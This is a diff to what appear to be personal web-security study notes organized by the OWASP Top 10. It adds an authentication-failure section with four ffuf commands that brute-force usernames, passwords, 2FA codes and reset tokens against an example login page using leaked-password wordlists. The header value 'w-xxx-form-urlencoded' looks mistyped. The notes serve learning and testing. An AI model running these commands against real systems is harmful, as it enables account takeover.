@@ -138,7 +138,20 @@ To identify XEE finding web pages that accept an XML or JSON user input with Bur
 
   ## *Top 6 composant vulnerability*
   ## *Top 7 authentification failure*
-  Part of web application where authentification can be attack. (ex: login forms)
+  Part of web application where authentification can be attack. (ex: login forms)  
+  
+  ![Capture d'écran de mon projet](auth_vs_auth.png)  
+
+  **Basic BrutForce**  
+  You can brutforce user, password, 2FA, session token,... and see what the server return in the error message.  
+  ```bash
+  ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://example.com/login.php -X POST -H 'Content-type: application/w-xxx-form-urlencoded' -d 'username=FUZZ&password=invalid' -fr 'Invalid user'
+  ffuf -w /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -u http://example.com/login.php -X POST -H 'Content-type: application/w-xxx-form-urlencoded' -d 'username=test&password=FUZZ' -fr 'Invalid password'
+  ffuf -w nb.txt -u http://example.com/2FA.php -X POST -H 'Content-type: application/w-xxx-form-urlencoded' -d 'otp=FUZZ' -fr 'Invalid 2FA'
+  ffuf -w tokens.txt -u http://example.com/reset_password.php?token=FUZZ -fr "The provided token is invalid"
+  ```
+
+  
   
   ## *Top 8 failure integrity data*
   ## *Top 9 journalisation defect*
